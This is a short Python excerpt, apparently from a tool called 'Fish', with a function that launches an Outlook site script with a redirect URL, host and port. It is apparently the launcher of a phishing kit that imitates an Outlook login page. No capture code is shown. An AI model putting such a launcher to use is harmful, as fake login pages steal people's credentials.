...
def exec(site):
    if site == 1:
        if Unix == True:
            ...
            os.system(f"clear && python Sites/Outlook/app.py {redirect_url} {host} {port}")

        # Change python version here if you want
        elif Windows == True:
            os.system(f"cls && python Sites\\Outlook\\app.py {redirect_url} {host} {port}")
        else:
            print("Error! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title=")
